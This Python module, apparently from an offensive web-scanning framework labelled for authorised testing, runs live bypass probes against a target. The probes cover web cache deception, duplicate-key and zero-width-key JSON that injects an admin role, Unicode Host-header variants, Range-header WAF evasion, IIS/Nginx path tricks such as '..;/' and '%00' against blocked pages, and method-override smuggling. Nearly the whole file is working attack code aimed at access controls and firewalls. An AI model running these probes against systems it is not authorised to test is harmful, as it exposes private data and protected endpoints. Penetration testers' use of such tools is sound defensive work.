#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - Exotic Bypass Module

⚠️ FOR AUTHORIZED TESTING ONLY ⚠️

Fills gaps around the existing WAF / firewall / gate / smuggling modules
with the less-common (but high-signal) bypass techniques:

    1. Cache deception          — extension-appended paths that trick
       front-end caches into serving an authenticated response to any
       viewer.
    2. JSON parser confusion    — duplicate keys, Unicode-normalized
       keys, and JSON-vs-form parse splits that let attackers pick which
       parser wins in a multi-tier deployment.
    3. Unicode / IDN host       — punycode + NFKC host mutations that
       route past Host-header allowlists.
    4. Range-header WAF bypass  — WAFs that inspect only the first N
       response bytes miss payloads reflected past a Range: cut.
    5. Server path quirks       — IIS/Nginx tricks: ;jsessionid, %00,
       trailing dot, unicode dot, %20/, ..;/, %2e%2e — many of which
       front-end filters misread relative to the origin.
    6. HTTP method smuggling    — GET → POST via X-HTTP-Method-Override
       + body, or POST → GET via method-override header, to slip past
       method-scoped ACLs.
"""
from __future__ import annotations

import re
import unicodedata
from typing import Any, Optional
from urllib.parse import urljoin, urlparse, urlunparse

from modules.base import BaseModule


class ExoticBypassModule(BaseModule):
    """Techniques the standard bypass ladder misses."""

    name = "Exotic Bypass"
    vuln_type = "bypass"

    CACHE_DECEPTION_SUFFIXES = [
        "/nonexistent.css",
        "/nonexistent.js",
        "/nonexistent.png",
        ";.css",
        ";x=y.css",
        "%00.css",
        "%23.css",
        "%3f.css",
    ]

    IIS_NGINX_QUIRKS = [
        # (label, transform-fn)
        ("iis_semicolon",       lambda p: p + ";x=y"),
        ("iis_trailing_dot",    lambda p: p + "."),
        ("iis_trailing_dotdot", lambda p: p + ".."),
        ("iis_asterisk",        lambda p: p + "*"),
        ("iis_tilde_shortname", lambda p: p + "::$DATA"),
        ("nginx_null",          lambda p: p + "%00"),
        ("nginx_semi_traverse", lambda p: p + "/..;/"),
        ("nginx_encoded_dot",   lambda p: p.replace("/", "/%2e/", 1) if "/" in p else p),
        ("apache_pct_2e_2e",    lambda p: p + "%2e%2e/"),
        ("java_unicode_dot",    lambda p: p + "./"),
    ]

    METHOD_OVERRIDE_HEADERS = [
        "X-HTTP-Method-Override",
        "X-HTTP-Method",
        "X-Method-Override",
        "_method",
    ]

    def __init__(self, engine):
        super().__init__(engine)
        # Number of bytes to send in Range header for the WAF-Range bypass.
        # Small enough that a WAF scanning ~8KiB of body will miss the
        # payload; big enough that most origins will honour the range.
        self.range_bytes = int(self.config.get("range_bypass_bytes", 8) or 8)

    # ------------------------------------------------------------------ #
    # BaseModule contract
    # ------------------------------------------------------------------ #

    def test(self, url: str, method: str, param: str, value: str) -> None:
        # Parameter-level checks — JSON confusion + method smuggling.
        if value and value.strip().startswith("{"):
            self._json_parser_confusion(url, method, param, value)
        self._method_smuggling(url, method, param, value)

    def test_url(self, url: str) -> None:
        # URL-level: cache deception, IIS/Nginx quirks, unicode host,
        # Range bypass.
        self._cache_deception(url)
        self._path_quirks(url)
        self._unicode_host(url)
        self._range_bypass(url)

    # ------------------------------------------------------------------ #
    # 1. Cache deception
    # ------------------------------------------------------------------ #

    def _cache_deception(self, url: str) -> None:
        try:
            baseline = self.requester.request(url, "GET")
        except Exception:
            return
        if baseline is None:
            return
        baseline_body = (getattr(baseline, "text", "") or "")[:1024]

        for suffix in self.CACHE_DECEPTION_SUFFIXES:
            deceptive = url.rstrip("/") + suffix
            try:
                resp = self.requester.request(deceptive, "GET")
            except Exception:
                continue
            if resp is None:
                continue
            body = (getattr(resp, "text", "") or "")[:1024]
            cache_hdr = " ".join([
                (resp.headers.get(h, "") or "")
                for h in ("Age", "X-Cache", "CF-Cache-Status", "X-Served-By", "Via")
            ])
            # Signal: same body as the private baseline AND cache header
            # says HIT / cached — front-end cached what should be private.
            hit = re.search(r"\bHIT\b|\bcached\b|\bAge:\s*[1-9]", cache_hdr, re.I)
            if hit and body and body[:512] == baseline_body[:512]:
                self._emit_signal(
                    vuln_type="cache_deception",
                    technique="Web cache deception",
                    url=deceptive,
                    evidence_text=(
                        f"Extension trick served the private response from cache. "
                        f"Cache indicators: {cache_hdr.strip()}"
                    ),
                    raw_confidence=0.90,
                )
                return  # one high-signal hit is enough

    # ------------------------------------------------------------------ #
    # 2. JSON parser confusion
    # ------------------------------------------------------------------ #

    def _json_parser_confusion(self, url: str, method: str, param: str, value: str) -> None:
        # Build two variants of the same JSON body:
        #   (a) duplicate-key: {"role":"user","role":"admin"}
        #   (b) unicode-normalized-key: {"role":"user","rοle":"admin"}
        # If the server accepts both, one parser sees "user", another sees
        # "admin" — classic auth-bypass surface.
        import json
        try:
            original = json.loads(value)
            if not isinstance(original, dict):
                return
        except Exception:
            return

        key = next(iter(original.keys()), None)
        if not key:
            return

        raw = json.dumps(original, separators=(",", ":"))
        dup = raw[:-1] + f',"{key}":"CANARY_ADMIN"' + raw[-1]
        unicode_key = key[0] + "​" + key[1:] if len(key) > 1 else key + "​"
        norm = raw[:-1] + f',"{unicode_key}":"CANARY_ADMIN"' + raw[-1]

        for label, payload in (("dup-key", dup), ("unicode-key", norm)):
            try:
                resp = self.requester.request(
                    url, method or "POST",
                    data=payload,
                    headers={"Content-Type": "application/json"},
                )
            except Exception:
                continue
            if resp is None:
                continue
            body = getattr(resp, "text", "") or ""
            status = getattr(resp, "status_code", 0)
            # Positive signal: server accepted the payload and reflected
            # the canary, OR responded with an elevated status change
            # relative to a normal request.
            if 200 <= status < 400 and (
                "CANARY_ADMIN" in body or self._looks_privileged(body)
            ):
                self._emit_signal(
                    vuln_type="json_confusion",
                    technique=f"JSON parser confusion ({label})",
                    url=url,
                    method=method,
                    param=param,
                    payload=payload,
                    evidence_text=(
                        f"Server accepted {label} JSON and returned "
                        f"HTTP {status}. Canary or privileged marker present in body."
                    ),
                    raw_confidence=0.75,
                )

    @staticmethod
    def _looks_privileged(body: str) -> bool:
        return bool(re.search(
            r"\brole\s*[:=]\s*[\"']?admin|\bis_admin\b|\bsuperuser\b",
            body, re.I,
        ))

    # ------------------------------------------------------------------ #
    # 3. Unicode / IDN Host header confusion
    # ------------------------------------------------------------------ #

    def _unicode_host(self, url: str) -> None:
        parsed = urlparse(url)
        host = parsed.hostname or ""
        if not host or host.replace(".", "").isdigit():
            return  # skip IPs

        variants = self._unicode_host_variants(host)
        try:
            baseline = self.requester.request(url, "GET")
        except Exception:
            return
        if baseline is None:
            return
        baseline_status = getattr(baseline, "status_code", 0)

        for variant, label in variants:
            try:
                resp = self.requester.request(
                    url, "GET", headers={"Host": variant}
                )
            except Exception:
                continue
            if resp is None:
                continue
            if getattr(resp, "status_code", 0) == baseline_status and \
               getattr(resp, "status_code", 0) < 400:
                # Server accepted the variant Host — routing may be lax.
                self._emit_signal(
                    vuln_type="host_confusion",
                    technique=f"Host-header {label} accepted",
                    url=url,
                    payload=variant,
                    evidence_text=(
                        f"Unicode/IDN Host variant {variant!r} returned same "
                        f"status as the canonical host — vhost routing does "
                        f"not enforce the ASCII/NFKC form."
                    ),
                    raw_confidence=0.55,
                )

    @staticmethod
    def _unicode_host_variants(host: str) -> list[tuple[str, str]]:
        variants: list[tuple[str, str]] = []
        # Full-width Latin letters (NFKC → ASCII).
        fw = "".join(chr(ord(c) - ord("a") + 0xFF41) if "a" <= c <= "z" else c for c in host)
        if fw != host:
            variants.append((fw, "full-width"))
        # NFKD-decomposed form.
        nfkd = unicodedata.normalize("NFKD", host)
        if nfkd != host:
            variants.append((nfkd, "NFKD"))
        # Trailing dot.
        variants.append((host + ".", "trailing-dot"))
        # Uppercase (case sensitivity slip).
        if host != host.upper():
            variants.append((host.upper(), "upper-case"))
        return variants

    # ------------------------------------------------------------------ #
    # 4. Range-header WAF bypass
    # ------------------------------------------------------------------ #

    def _range_bypass(self, url: str) -> None:
        try:
            base = self.requester.request(url, "GET")
        except Exception:
            return
        if base is None:
            return
        # Only worth trying when the endpoint likely returns dynamic body.
        if len(getattr(base, "text", "") or "") < self.range_bytes * 4:
            return
        try:
            ranged = self.requester.request(
                url, "GET",
                headers={"Range": f"bytes={self.range_bytes}-"},
            )
        except Exception:
            return
        if ranged is None:
            return
        # Signal: server honours Range (206) and returns different content.
        if getattr(ranged, "status_code", 0) == 206:
            self._emit_signal(
                vuln_type="waf_bypass",
                technique="Range-header WAF bypass surface",
                url=url,
                payload=f"Range: bytes={self.range_bytes}-",
                evidence_text=(
                    "Origin honours Range requests. WAFs that inspect only "
                    "the first N response bytes may miss reflections past "
                    f"byte {self.range_bytes}."
                ),
                raw_confidence=0.60,
            )

    # ------------------------------------------------------------------ #
    # 5. Server path quirks
    # ------------------------------------------------------------------ #

    def _path_quirks(self, url: str) -> None:
        try:
            baseline = self.requester.request(url, "GET")
        except Exception:
            return
        if baseline is None:
            return
        baseline_status = getattr(baseline, "status_code", 0)
        # Only meaningful if baseline is blocked / 403 / 404 — otherwise
        # the quirk isn't buying anything.
        if baseline_status not in (401, 403, 404):
            return

        parsed = urlparse(url)
        for label, mutate in self.IIS_NGINX_QUIRKS:
            mutated_path = mutate(parsed.path or "/")
            mutated = urlunparse(parsed._replace(path=mutated_path))
            try:
                resp = self.requester.request(mutated, "GET")
            except Exception:
                continue
            if resp is None:
                continue
            status = getattr(resp, "status_code", 0)
            if 200 <= status < 300 or (status not in (401, 403, 404) and status < 500):
                self._emit_signal(
                    vuln_type="acl_bypass",
                    technique=f"Path quirk bypass ({label})",
                    url=mutated,
                    payload=mutated_path,
                    evidence_text=(
                        f"Baseline HTTP {baseline_status} → mutated HTTP "
                        f"{status}. Front-end ACL/rewrite normalized the "
                        f"quirked path differently from the origin."
                    ),
                    raw_confidence=0.80,
                )

    # ------------------------------------------------------------------ #
    # 6. HTTP method smuggling
    # ------------------------------------------------------------------ #

    def _method_smuggling(self, url: str, method: str, param: str, value: str) -> None:
        # Case A: endpoint refuses GET but allows POST. Try to sneak in a
        # POST via header override on the GET path.
        try:
            base = self.requester.request(url, "GET")
        except Exception:
            return
        if base is None:
            return
        baseline_status = getattr(base, "status_code", 0)
        if baseline_status not in (401, 403, 405):
            return

        for hdr in self.METHOD_OVERRIDE_HEADERS:
            try:
                resp = self.requester.request(
                    url, "GET",
                    headers={hdr: "POST"},
                )
            except Exception:
                continue
            if resp is None:
                continue
            status = getattr(resp, "status_code", 0)
            if status != baseline_status and 200 <= status < 400:
                self._emit_signal(
                    vuln_type="method_smuggling",
                    technique=f"HTTP method smuggling via {hdr}",
                    url=url,
                    payload=f"{hdr}: POST",
                    evidence_text=(
                        f"Baseline HTTP {baseline_status} → override HTTP "
                        f"{status}. Server honours {hdr} to switch method."
                    ),
                    raw_confidence=0.75,
                )
                return
